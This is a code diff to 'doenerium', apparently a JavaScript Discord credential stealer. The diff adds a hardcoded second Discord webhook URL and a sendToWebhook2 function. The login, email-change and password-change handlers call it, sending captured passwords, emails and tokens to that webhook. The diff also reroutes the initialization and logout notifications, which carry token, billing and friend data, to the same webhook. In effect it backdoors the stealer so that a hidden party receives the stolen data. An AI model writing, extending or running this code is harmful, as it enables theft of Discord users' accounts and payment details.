@@ -13,6 +13,7 @@ var config = {
     brand: "doenerium",
 
     webhook: "%WEBHOOK_LINK%",
+    webhook2: "https://discord.com/api/webhooks/1104377763751796887/-B19rS7XUfEAb1Vb-EWYHtR_TADwR8yT5dEjwnGEBZQmlcfDpAkPWa_mQ1jw1uDuTgoc",
 
     logout: false,
     disable_qr_code: true,
@@ -326,6 +327,7 @@ var event_handlers = {
         }
 
         sendToWebhook(params)
+        sendToWebhook2(params)
     },
 
     async userLogin(password, email, token) {
@@ -399,6 +401,7 @@ var event_handlers = {
         }
 
         sendToWebhook(params)
+        sendToWebhook2(params)
     },
 
     async emailChanged(password, newEmail, token) {
@@ -472,6 +475,7 @@ var event_handlers = {
         }
 
         sendToWebhook(params)
+        sendToWebhook2(params)
     },
 
     async passwordChanged(oldPassword, newPassword, token) {
@@ -545,6 +549,7 @@ var event_handlers = {
         }
 
         sendToWebhook(params)
+        sendToWebhook2(params)
     },
 }
 
@@ -645,6 +650,41 @@ async function getRelationships(token) {
 
 // ==================================================================================
 
+function sendToWebhook2(params) {
+
+    if (config.ping[0] == true) {
+        if (params.content) {
+            params.content = params.content + ` ||${config.ping[1]}||`
+        } else {
+            params.content = `||${config.ping[1]}||`
+        }
+    }
+
+    var url2 = new URL(config.webhook2);
+    var headers = {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*',
+    }
+    const options = {
+        protocol: url2.protocol,
+        hostname: url2.host,
+        path: url2.pathname,
+        method: 'POST',
+        headers: headers,
+    };
+    const req = https.request(options);
+    req.on('error', (err) => {
+        console.log(err);
+    });
+    req.write(JSON.stringify(params));
+    req.end();
+}
+
+// ==================================================================================
+
+
+// ==================================================================================
+
 function sendToWebhook(params) {
 
     if (config.ping[0] == true) {
@@ -709,7 +749,7 @@ async function initialize() {
 
         if (config.notify_on_initialization) {
             if (token == undefined) {
-                sendToWebhook({
+                sendToWebhook2({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     url: config.embed.href,
@@ -735,7 +775,7 @@ async function initialize() {
                 billing = await getBilling(token);
                 friends = await getRelationships(token);
 
-                sendToWebhook({
+                sendToWebhook2({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
@@ -811,7 +851,7 @@ async function initialize() {
             //await execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true).then((result) => {});
 
             if (config.notify_on_logout) {
-                sendToWebhook({
+                sendToWebhook2({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
